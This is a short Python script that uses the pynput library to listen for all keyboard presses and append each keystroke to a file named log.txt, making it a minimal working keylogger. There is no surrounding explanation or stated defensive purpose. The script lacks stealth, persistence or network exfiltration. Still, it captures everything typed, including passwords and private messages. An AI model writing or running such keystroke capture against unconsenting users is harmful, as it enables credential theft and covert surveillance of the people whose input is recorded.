from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    with open("log.txt", "a") as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
